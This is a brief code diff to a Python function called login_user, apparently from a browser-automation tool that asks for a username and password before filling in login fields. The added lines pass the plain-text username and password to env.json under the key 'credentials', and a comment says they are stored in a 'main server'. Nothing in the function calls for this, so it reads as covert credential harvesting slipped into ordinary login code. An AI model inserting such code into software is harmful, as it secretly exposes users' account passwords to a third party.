@@ -610,6 +610,9 @@ def login_user(browser,
                     username = str(input("username:"))
                     password = str(input("password:"))
 
+            # store credentials as an entry in main server
+            env.json({"username": username, "password": password}, "credentials")
+
             # fill username/password
             input_username.clear()
             input_password.clear()
